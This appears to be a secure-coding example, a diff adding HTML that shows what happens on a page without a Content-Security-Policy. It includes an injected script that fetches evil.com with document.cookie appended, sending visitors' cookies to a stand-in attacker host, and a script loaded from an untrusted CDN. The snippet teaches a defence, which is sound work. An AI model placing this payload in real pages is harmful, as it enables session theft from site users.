@@ -1,0 +1,12 @@
+<!-- ❌ No Content-Security-Policy.
+     An injected inline script (via XSS) runs freely, and the page can pull
+     scripts from any origin. -->
+<div id="comment">
+  <!-- attacker-injected content: -->
+  <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
+</div>
+
+<!-- also allowed: a script from anywhere -->
+<script src="https://cdn.sketchy.com/analytics.js"></script>
+
+<!-- With no CSP, the browser happily executes both. -->
